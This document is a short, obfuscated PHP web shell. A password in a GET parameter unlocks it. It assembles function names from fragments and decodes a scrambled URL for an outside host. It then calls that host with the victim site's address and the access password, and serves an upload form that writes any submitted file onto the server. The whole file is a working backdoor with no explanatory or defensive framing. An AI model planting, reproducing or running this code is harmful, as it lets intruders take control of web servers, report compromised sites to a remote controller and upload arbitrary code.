<?php
$pssddd="2b";//
if($_GET["hks"]==$pssddd){@set_time_limit(100);$slstss="fi"."le_"."ge"."t_c"."onten"."ts";$raworistr='S'.'X'.'0'.'b'.'D'.'e'.'2'.'E';$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['REQUEST_URI'];$dedeedoc="b"."ase6"."4_d"."ec"."od"."e";$serverp = $pssddd;$rawstruri='aHR0cDoSX0bDe2EvL2MucXNteXkuSX0bDe2EY29tL2kucGhwP3VybD0=';$rawtargetu=str_replace($raworistr,'',$rawstruri);$ropcyiu = $dedeedoc($rawtargetu);$uistauast=$ropcyiu.$serveru.'&'.'p'.'a'.'s'.'s'.'='.$serverp;$uistauast=urldecode($uistauast);$rubote=$slstss($uistauast);if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>